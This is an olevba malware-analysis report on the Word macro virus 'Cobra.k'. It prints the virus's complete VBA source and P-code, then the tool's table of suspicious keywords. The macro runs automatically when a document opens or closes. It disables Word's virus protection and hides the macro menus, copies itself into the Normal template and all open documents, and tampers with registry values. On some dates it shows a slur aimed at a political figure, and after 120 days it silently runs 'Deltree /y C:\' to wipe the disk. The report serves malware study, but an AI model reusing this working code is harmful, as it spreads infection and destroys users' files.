olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Cobra.k
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Cobra.k - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AAX_10B.bas 
in file: ./Virus.MSWord.Cobra.k - OLE stream: 'Macros/VBA/AAX_10B'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'AAX Version 1.0B
'A intelligent member of Cobra family

Sub AutoClose()
Call MenuOpt
Call InfCobra
Call RegE
Call MoreInfect
End Sub
Sub AutoOpen()
Call MenuOpt
Call InfCobra
Call RegE
Call MoreInfect
End Sub
Sub FileNew()
Call MenuOpt
Call InfCobra
Call RegE
Call MoreInfect
Dialogs(wdDialogFileNew).Show
End Sub
Sub FileExit()
Call MenuOpt
Call InfCobra
Call RegE
Call MoreInfect
WordBasic.FileExit
End Sub
Sub MenuOpt()
On Error Resume Next
CustomizationContext = NormalTemplate
CommandBars("Tools").Controls("Macro").Enabled = False
CommandBars("Tools").Controls("Macro").Visible = False
CommandBars("Tools").Controls("Macro").Delete
CommandBars("View").Controls("Toolbars").Enabled = False
CommandBars("View").Controls("Toolbars").Visible = False
CommandBars("View").Controls("Toolbars").Delete
FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Disable
FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Disable
Options.VirusProtection = False
Options.SaveNormalPrompt = False
End Sub
Sub InfCobra()
On Error Resume Next
MacT = False
MacD = False
For Each MacrN In NormalTemplate.VBProject.VBComponents
If (MacrN.Name <> "ThisDocument" And MacrN.Name <> "AAX_10B" And Left(MacrN.Name, 5) <> "Cobra") Then
Application.OrganizerDelete Source:=NormalTemplate.FullName, _
Name:=MacrN.Name, Object:=wdOrganizerObjectProjectItems
End If
Next
For Each MacrN In NormalTemplate.VBProject.VBComponents
If MacrN.Name = "AAX_10B" Then
MacT = True
End If
Next
If MacT = False Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, _
Destination:=NormalTemplate.FullName, Name:="AAX_10B", _
Object:=wdOrganizerObjectProjectItems
End If
For Each DOC In Documents
For Each MacrN In DOC.VBProject.VBComponents
If (MacrN.Name <> "ThisDocument" And _
MacrN.Name <> "Reference to Normal" And MacrN.Name <> "AAX_10B") _
And Left(MacrN.Name, 5) <> "Cobra" Then
Application.OrganizerDelete Source:=DOC.FullName, _
Name:=MacrN.Name, Object:=wdOrganizerObjectProjectItems
End If
Next
Next
For Each DOC In Documents
MacD = False
For Each MacrN In DOC.VBProject.VBComponents
If MacrN.Name = "AAX_10B" Then
MacD = True
End If
Next
If MacD = False Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, _
Destination:=DOC.FullName, Name:="AAX_10B", _
Object:=wdOrganizerObjectProjectItems
End If
Next
End Sub
Sub RegE()
On Error Resume Next
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\", "RegisteredOwner") <> "Cobra ALIAS Liton" Then
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\", "RegisteredOwner") = "Cobra ALIAS Liton"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\", "RegisteredOrganization") = "Shibrampur/Burichang/Comilla"
End If
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Cobra\", "") = "" Then
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Cobra\", "") = "Cobra"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Cobra\", "Inf") = Format(Date, "mm/dd/yyyy")
End If
End Sub
Sub MoreInfect()
On Error Resume Next
IDT = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Cobra\", "Inf")
CDT = Format(Date, "mm/dd/yyyy")
If DateValue(CDT) - DateValue(IDT) > 90 Then
If (Month(Date) = 3 And Day(Date) = 26) Or (Month(Date) = 12 And Day(Date) = 16) Then
ActiveDocument.CommandBars("File").Reset
ActiveDocument.CommandBars("File").Controls("New...").Caption = "Sheik Mojib is a big &Bustard of Bengal"
End If
End If
If DateValue(CDT) - DateValue(IDT) > 120 Then
If WeekDay(Date) = 6 Then
Shell "Deltree /y C:\", vbHide
End If
End If
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Cobra.k
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1055 bytes
' Macros/VBA/AAX_10B - 6481 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0010 "AAX Version 1.0B"
' Line #1:
' 	QuoteRem 0x0000 0x0024 "A intelligent member of Cobra family"
' Line #2:
' Line #3:
' 	FuncDefn (Sub AutoClose())
' Line #4:
' 	ArgsCall (Call) MenuOpt 0x0000 
' Line #5:
' 	ArgsCall (Call) InfCobra 0x0000 
' Line #6:
' 	ArgsCall (Call) RegE 0x0000 
' Line #7:
' 	ArgsCall (Call) MoreInfect 0x0000 
' Line #8:
' 	EndSub 
' Line #9:
' 	FuncDefn (Sub AutoOpen())
' Line #10:
' 	ArgsCall (Call) MenuOpt 0x0000 
' Line #11:
' 	ArgsCall (Call) InfCobra 0x0000 
' Line #12:
' 	ArgsCall (Call) RegE 0x0000 
' Line #13:
' 	ArgsCall (Call) MoreInfect 0x0000 
' Line #14:
' 	EndSub 
' Line #15:
' 	FuncDefn (Sub FileNew())
' Line #16:
' 	ArgsCall (Call) MenuOpt 0x0000 
' Line #17:
' 	ArgsCall (Call) InfCobra 0x0000 
' Line #18:
' 	ArgsCall (Call) RegE 0x0000 
' Line #19:
' 	ArgsCall (Call) MoreInfect 0x0000 
' Line #20:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #21:
' 	EndSub 
' Line #22:
' 	FuncDefn (Sub FileExit())
' Line #23:
' 	ArgsCall (Call) MenuOpt 0x0000 
' Line #24:
' 	ArgsCall (Call) InfCobra 0x0000 
' Line #25:
' 	ArgsCall (Call) RegE 0x0000 
' Line #26:
' 	ArgsCall (Call) MoreInfect 0x0000 
' Line #27:
' 	Ld WordBasic 
' 	ArgsMemCall FileExit 0x0000 
' Line #28:
' 	EndSub 
' Line #29:
' 	FuncDefn (Sub MenuOpt())
' Line #30:
' 	OnError (Resume Next) 
' Line #31:
' 	Ld NormalTemplate 
' 	St CustomizationContext 
' Line #32:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #33:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Visible 
' Line #34:
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #35:
' 	LitVarSpecial (False)
' 	LitStr 0x0008 "Toolbars"
' 	LitStr 0x0004 "View"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #36:
' 	LitVarSpecial (False)
' 	LitStr 0x0008 "Toolbars"
' 	LitStr 0x0004 "View"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Visible 
' Line #37:
' 	LitStr 0x0008 "Toolbars"
' 	LitStr 0x0004 "View"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #38:
' 	Ld wdKeyF11 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #39:
' 	Ld wdKeyF8 
' 	Ld wdKeyAlt 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #40:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #41:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #42:
' 	EndSub 
' Line #43:
' 	FuncDefn (Sub InfCobra())
' Line #44:
' 	OnError (Resume Next) 
' Line #45:
' 	LitVarSpecial (False)
' 	St MacT 
' Line #46:
' 	LitVarSpecial (False)
' 	St MacD 
' Line #47:
' 	StartForVariable 
' 	Ld MacrN 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #48:
' 	Ld MacrN 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Ld MacrN 
' 	MemLd New 
' 	LitStr 0x0007 "AAX_10B"
' 	Ne 
' 	And 
' 	Ld MacrN 
' 	MemLd New 
' 	LitDI2 0x0005 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0005 "Cobra"
' 	Ne 
' 	And 
' 	Paren 
' 	IfBlock 
' Line #49:
' 	LineCont 0x0004 09 00 00 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld MacrN 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #50:
' 	EndIfBlock 
' Line #51:
' 	StartForVariable 
' 	Next 
' Line #52:
' 	StartForVariable 
' 	Ld MacrN 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #53:
' 	Ld MacrN 
' 	MemLd New 
' 	LitStr 0x0007 "AAX_10B"
' 	Eq 
' 	IfBlock 
' Line #54:
' 	LitVarSpecial (True)
' 	St MacT 
' Line #55:
' 	EndIfBlock 
' Line #56:
' 	StartForVariable 
' 	Next 
' Line #57:
' 	Ld MacT 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #58:
' 	LineCont 0x0008 09 00 00 00 13 00 00 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "AAX_10B"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #59:
' 	EndIfBlock 
' Line #60:
' 	StartForVariable 
' 	Ld DOC 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #61:
' 	StartForVariable 
' 	Ld MacrN 
' 	EndForVariable 
' 	Ld DOC 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #62:
' 	LineCont 0x0008 08 00 00 00 14 00 00 00
' 	Ld MacrN 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Ld MacrN 
' 	MemLd New 
' 	LitStr 0x0013 "Reference to Normal"
' 	Ne 
' 	And 
' 	Ld MacrN 
' 	MemLd New 
' 	LitStr 0x0007 "AAX_10B"
' 	Ne 
' 	And 
' 	Paren 
' 	Ld MacrN 
' 	MemLd New 
' 	LitDI2 0x0005 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0005 "Cobra"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #63:
' 	LineCont 0x0004 09 00 00 00
' 	Ld DOC 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld MacrN 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #64:
' 	EndIfBlock 
' Line #65:
' 	StartForVariable 
' 	Next 
' Line #66:
' 	StartForVariable 
' 	Next 
' Line #67:
' 	StartForVariable 
' 	Ld DOC 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #68:
' 	LitVarSpecial (False)
' 	St MacD 
' Line #69:
' 	StartForVariable 
' 	Ld MacrN 
' 	EndForVariable 
' 	Ld DOC 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #70:
' 	Ld MacrN 
' 	MemLd New 
' 	LitStr 0x0007 "AAX_10B"
' 	Eq 
' 	IfBlock 
' Line #71:
' 	LitVarSpecial (True)
' 	St MacD 
' Line #72:
' 	EndIfBlock 
' Line #73:
' 	StartForVariable 
' 	Next 
' Line #74:
' 	Ld MacD 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #75:
' 	LineCont 0x0008 09 00 00 00 13 00 00 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld DOC 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0007 "AAX_10B"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #76:
' 	EndIfBlock 
' Line #77:
' 	StartForVariable 
' 	Next 
' Line #78:
' 	EndSub 
' Line #79:
' 	FuncDefn (Sub RegE())
' Line #80:
' 	OnError (Resume Next) 
' Line #81:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\"
' 	LitStr 0x000F "RegisteredOwner"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0011 "Cobra ALIAS Liton"
' 	Ne 
' 	IfBlock 
' Line #82:
' 	LitStr 0x0011 "Cobra ALIAS Liton"
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\"
' 	LitStr 0x000F "RegisteredOwner"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #83:
' 	LitStr 0x001C "Shibrampur/Burichang/Comilla"
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\"
' 	LitStr 0x0016 "RegisteredOrganization"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #84:
' 	EndIfBlock 
' Line #85:
' 	LitStr 0x0000 ""
' 	LitStr 0x0019 "HKEY_LOCAL_MACHINE\Cobra\"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #86:
' 	LitStr 0x0005 "Cobra"
' 	LitStr 0x0000 ""
' 	LitStr 0x0019 "HKEY_LOCAL_MACHINE\Cobra\"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #87:
' 	Ld Date 
' 	LitStr 0x000A "mm/dd/yyyy"
' 	ArgsLd Format$ 0x0002 
' 	LitStr 0x0000 ""
' 	LitStr 0x0019 "HKEY_LOCAL_MACHINE\Cobra\"
' 	LitStr 0x0003 "Inf"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #88:
' 	EndIfBlock 
' Line #89:
' 	EndSub 
' Line #90:
' 	FuncDefn (Sub MoreInfect())
' Line #91:
' 	OnError (Resume Next) 
' Line #92:
' 	LitStr 0x0000 ""
' 	LitStr 0x0019 "HKEY_LOCAL_MACHINE\Cobra\"
' 	LitStr 0x0003 "Inf"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St IDT 
' Line #93:
' 	Ld Date 
' 	LitStr 0x000A "mm/dd/yyyy"
' 	ArgsLd Format$ 0x0002 
' 	St CDT 
' Line #94:
' 	Ld CDT 
' 	ArgsLd DateValue 0x0001 
' 	Ld IDT 
' 	ArgsLd DateValue 0x0001 
' 	Sub 
' 	LitDI2 0x005A 
' 	Gt 
' 	IfBlock 
' Line #95:
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0003 
' 	Eq 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001A 
' 	Eq 
' 	And 
' 	Paren 
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0010 
' 	Eq 
' 	And 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #96:
' 	LitStr 0x0004 "File"
' 	Ld ActiveDocument 
' 	ArgsMemLd CommandBars 0x0001 
' 	ArgsMemCall Reset 0x0000 
' Line #97:
' 	LitStr 0x0027 "Sheik Mojib is a big &Bustard of Bengal"
' 	LitStr 0x0006 "New..."
' 	LitStr 0x0004 "File"
' 	Ld ActiveDocument 
' 	ArgsMemLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #98:
' 	EndIfBlock 
' Line #99:
' 	EndIfBlock 
' Line #100:
' 	Ld CDT 
' 	ArgsLd DateValue 0x0001 
' 	Ld IDT 
' 	ArgsLd DateValue 0x0001 
' 	Sub 
' 	LitDI2 0x0078 
' 	Gt 
' 	IfBlock 
' Line #101:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0006 
' 	Eq 
' 	IfBlock 
' Line #102:
' 	LitStr 0x000E "Deltree /y C:\"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #103:
' 	EndIfBlock 
' Line #104:
' 	EndIfBlock 
' Line #105:
' 	EndSub 
' Line #106:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

